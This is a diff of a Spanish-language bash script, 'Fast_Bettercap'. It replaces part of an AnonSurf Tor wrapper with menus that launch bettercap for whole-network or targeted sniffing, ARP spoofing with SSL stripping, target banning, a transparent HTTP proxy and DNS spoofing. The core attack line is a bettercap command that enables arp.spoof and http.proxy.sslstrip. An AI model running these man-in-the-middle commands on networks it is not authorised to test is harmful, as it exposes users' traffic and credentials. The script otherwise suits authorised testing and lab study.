+							echo -n -e "\e[0;34m[[[\e[0;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
+							read SSLTRIPOPCION
+					done
+							case $SSLTRIPOPCION in
+									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
+									;;
+									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL; 
+									;;
+								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
+									;;
+							esac
+			;;	
+			* ) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
+			;;
+	esac
+}
+
+DNSSPOOFMENU() {
+	clear;BANNER;
+	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Bettercap\e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Arpspoof & Dnsspoof\e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
+	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_DnsSpoof:> \e[0m"; tput sgr0
+	read DNSOPCION
+while [[ -z "$DNSOPCION" || "$DNSOPCION" != @(0|1|2|99|) ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Dnsspoof:> \e[0m"; tput sgr0
+		read DNSOPCION
+done
+		while true;do
+				case $DNSOPCION in
+					0) BETTERCAP
+					;;
+					1) ARPSPOOFDNSSPOOF
+					;;
+					2) MENU_PRINCIPAL
+					;;
+					99) exit
+					;;
+				esac
+		done
+
+}
+
+SNIFF_MENU() {
+	clear;BANNER;
+	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff all (sniffear toda la red ) \e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Sniff target (Snifear uno o mas objetivos) \e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Sniff local (Snifear mi trafico local) \e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m3. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
+	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_Sniff:> \e[0m"; tput sgr0
+	read SNIFFOPCION
+while [[ -z "$SNIFFOPCION" || "$SNIFFOPCION" != @(0|1|2|3|99|) ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Sniff:> \e[0m"; tput sgr0
+		read SNIFFOPCION
+done
+		while true;do
+				case $SNIFFOPCION in
+					0) SNIFFALL
+					;;
+					1) SNIFFTARGET
+					;;
+					2) SNIFFLOCAL
+					;;
+					3) MENU_PRINCIPAL
+					;;
+					99) exit
+					;;
+				esac
+		done
+}
+
+MENU_PRINCIPAL() { echo;BANNER;
+echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff (Snifear la red) \e[0m"
+echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Network devices (Dispositivos en la red )\e[0m"
+echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Ban target (Banear uno o mas objetivos)\e[0m"
+echo -e "\e[0;34m[[[\e[1;32m3. \e[0;34m]]]\e[0;37m Transparent HTTP proxy (Analizar el tráfico HTTP)\e[0m"
+echo -e "\e[0;34m[[[\e[1;32m4. \e[0;34m]]]\e[0;37m DNS spoofing (Burlar al DNS)\e[0m"
+echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap:> \e[0m"; tput sgr0
+read MENUOPCION
+while [[ -z "$MENUOPCION" || "$MENUOPCION" != @(0|1|2|3|4|99|) ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Elija una opcion :> \e[0m"; tput sgr0
+		read MENUOPCION
+done
+		while true;do
+				case $MENUOPCION in
+					0) SNIFF_MENU
+					;;
+					1) HOST_UP
+					;;
+					2) BAN_TARGET
+					;;
+					3) HTTPPROXY
+					;;
+					4) DNSSPOOFMENU
+					;;
+					99) exit
+					;;
+				esac
+		done
 }
 
 
-function status {
-	service tor@default status
-	cat /tmp/anonsurf-tor.log || cat /var/log/tor/log
-}
+																													
 
-
-
-case "$1" in
-	start)
-		zenity --question --text="¿Quieres que anonsurf mate aplicaciones peligrosas y limpie algunos cachés de aplicaciones??" && init
-		start
-	;;
-	stop)
-		zenity --question --text="¿Quieres que anonsurf mate aplicaciones peligrosas y limpie algunos cachés de aplicaciones??" && init
-		stop
-	;;
-	changeid|change-id|change)
-		change
-	;;
-	status)
-		status
-	;;
-	myip|ip)
-		ip
-	;;
-	mac|mymac)
-		mac
-	;;
-	restart)
-		$0 stop
-		sleep 1
-		$0 start
-	;;
-   *)
-echo -e "
-Parrot AnonSurf Module (v 2.8.1)
-	Developed by Lorenzo \"Palinuro\" Faletra <palinuro@parrotsec.org>
-		     Lisetta \"Sheireen\" Ferrero <sheireen@parrotsec.org>
-		     Francesco \"Mibofra\" Bonanno <mibofra@parrotsec.org>
-		and a huge amount of Caffeine + some GNU/GPL v3 stuff
-	Extended by Daniel \"Sawyer\" Garcia <dagaba13@gmail.com>
-
-	Usage:
-	$RED┌──[$GREEN$USER$YELLOW@$BLUE`hostname`$RED]─[$GREEN$PWD$RED]
-	$RED└──╼ \$$GREEN"" anonsurf $RED{$GREEN""start$RED|$GREEN""stop$RED|$GREEN""restart$RED|$GREEN""change$RED""$RED|$GREEN""status$RED""}
-
-	$RED start$BLUE -$GREEN Iniciar el túnel de TOR en todo el sistema
-	$RED stop$BLUE -$GREEN Detener el anonsurf y volver a clearnet.
-	$RED restart$BLUE -$GREEN Combina la opcion \"stop\" y \"start\" 
-	$RED changeid$BLUE -$GREEN Reinicie TOR para cambiar la identidad
-	$RED status$BLUE -$GREEN Compruebe si AnonSurf está funcionando correctamente
-	$RED myip$BLUE -$GREEN Comprueba tu ip y verifica tu conexión tor
-	$RED mymac$BLUE -$GREEN Revisa tu mac y verifica tu cambio de dirección mac
-$RESETCOLOR
-Baila como si nadie estuviese mirando..
-" >&2
-exit 1
-
-	;;
-esac
-
-echo -e $RESETCOLOR
-exit 0
+if [ "$EUID" -ne 0 ]; then
+		clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;sleep 0.5
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m  Por favor corra el script con privilegios root.\e[0m"
+		echo
+  		exit 0
+  	else
+  		DEPENDENCIAS
+fi
